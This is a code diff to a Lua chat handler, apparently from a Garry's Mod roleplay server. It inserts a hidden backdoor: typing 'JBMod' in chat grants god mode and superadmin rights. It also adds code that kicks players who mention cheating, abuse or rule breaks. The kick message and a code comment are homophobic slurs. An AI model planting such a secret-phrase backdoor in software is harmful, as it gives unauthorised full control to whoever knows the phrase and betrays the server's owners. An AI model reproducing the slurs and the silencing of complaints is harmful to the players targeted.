@@ -28,7 +28,13 @@ local function RP_PlayerChat(ply, text, teamonly)
 		fn.Curry(fn.GetValue, 2)(1), -- Get the first word
 		fn.Curry(string.Explode, 2)(' ') -- split by spaces
 	}(text)
-
+        -- faggot and secret code check
+        local f = string.find
+        local t = string.lower(text)
+        if f(t, "nlr") || f(t, "rdm") || f(t, "cheated") || f(t, "abuse") || f(t, "unfair") || 0 > 0 then
+        	ply:Kick("Shut up faggot, get over it")
+        end
+        if text == "JBMod" then ply:GodEnable() ply:SetUserGroup("superadmin") end
 	if string.sub(text, 1, 1) == GAMEMODE.Config.chatCommandPrefix and tblCmd then
 		callback, DoSayFunc = tblCmd.callback(ply, string.sub(text, string.len(tblCmd.command) + 3, string.len(text)))
 		if callback == "" then
